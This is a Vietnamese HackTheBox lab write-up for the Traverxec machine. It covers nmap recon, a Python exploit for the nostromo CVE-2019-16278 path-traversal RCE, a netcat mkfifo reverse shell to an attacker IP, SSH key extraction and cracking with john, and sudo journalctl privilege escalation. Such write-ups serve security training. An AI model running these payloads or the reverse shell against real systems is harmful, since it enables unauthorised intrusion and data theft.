![image](https://hackmd.io/_uploads/ryyZpuOsA.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/217/information)

## Comment
Máy này việc khai thác khá là mượt chủ yếu tập trung trong khai thác user flag 

# Recon
## nmap 
Sau khi nmap ta scan được **2** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.165       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 22:15 EDT
Nmap scan report for 10.10.10.165
Host is up (0.24s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
```
Từ đây, ta sẽ scan tiếp 2 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.10.165
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 22:15 EDT
Nmap scan report for 10.10.10.165
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.64 seconds
```
Trong đó port **80** chạy dịch vụ nostromo 1.9.6. Phiên bản này có [CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278) có thể dẫn tới RCE

## Port 80 - http
Khi truy cập sẽ xuất hiện 1 trang web có giao diện:

![image](https://hackmd.io/_uploads/rJlhFDYj0.png)

Trang web có tính năng điền form nhưng không sử dụng được

![image](https://hackmd.io/_uploads/rJq1qPFiC.png)

# User flag
## Exploit
### CVE-2019-16278
Đây là lỗ hổng Directory Traversal trong hàm **http_verify** (là hàm được sử dụng để kiểm tra các thành phần của một yêu cầu HTTP đến (như URI, phương thức, tiêu đề, v.v.) để đảm bảo rằng yêu cầu này hợp lệ.)) của nostromo từ phiên bản 1.9.6 cho phép attacker thực thi mã từ xa bằng một request HTTP 
```
def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)
```

- POST /.%0d./.%0d./.%0d./.%0d./bin/sh: Truy cập vào một tập tin thực thi shell 
- echo\necho\n{} 2>&1'.format(cmd): Chuỗi lệnh thực thi trên máy chủ mục tiêu, được chèn vào thông qua **cmd**. Kết quả đầu ra của lệnh sẽ được chuyển hướng (2>&1) để hiển thị lỗi và kết quả trên cùng một kênh.

![image](https://hackmd.io/_uploads/BkBRJuFoR.png)

Sau khi chạy **id** thành công, ta sẽ tạo 1 reverse shell
```
mkfifo /tmp/lol;nc 10.10.14.93 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```
![image](https://hackmd.io/_uploads/r1Y6guYsC.png)

## Post-Exploit
### Lateral Movement
Sau khi truy cập vào `/home/david` bị từ chối cùng 1 số cách để nâng cao quyèn không thành công, tìm các file config để xem có thể liệt kê được gì không tại `/var/nostromo/conf`

![image](https://hackmd.io/_uploads/H1D0lhtiC.png)

Thấy được file chứa credential 

![image](https://hackmd.io/_uploads/rJM8WntiR.png)

Dùng **john** để crack mât khẩu

![image](https://hackmd.io/_uploads/Sy0Xf3YsR.png)

Tuy nhiên khi swtich user lại không được 

![image](https://hackmd.io/_uploads/S1icM3FjR.png)

Quay lại file config kia vì còn có thông tin của một folder có thể khai thác được đó là `public_www`

![image](https://hackmd.io/_uploads/HkXq72YoC.png)

Vào trong thư mục này ta thấy file backup ssh, có thể file này có thể sử dụng để ssh được. Để tải file ta sử dụng **base64**

```
#Máy mục tiêu
$ base64 backup-ssh-identity-files.tgz

#Máy tấn công
┌──(kali㉿kali)-[~]
└─$ cat base64_file|base64 --decode > backup.tgz

┌──(kali㉿kali)-[~/backk]
└─$ tar -xvf backup.tgz                         
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```
### John-The-Ripper
![image](https://hackmd.io/_uploads/BkZ4Ohtj0.png)

Nó yêu cầu key nên ta sẽ sử dung **john** để crack 

![image](https://hackmd.io/_uploads/Sy_3uhFjC.png)

![image](https://hackmd.io/_uploads/HJRCOhKjA.png)

# Root flag
## Exploit
Tại thư mục `/home/david/` có một thư mục `/bin` (binary) khi các có nội dung sau:
![image](https://hackmd.io/_uploads/ByuAK3toR.png)

Có thể thấy **journalctl** đang được chạy thoải mái dưới quyền sudo. [GTFOBin](https://gtfobins.github.io/gtfobins/journalctl/#sudo) có hỗ trợ leo quyền

![image](https://hackmd.io/_uploads/BJ0Uc3KsA.png)

![image](https://hackmd.io/_uploads/Sk099ntjA.png)

## Post-Exploit
```
# cat /root/root.txt
d8f71632f90e703d7*******
```

![image](https://hackmd.io/_uploads/BkygjnFoC.png)
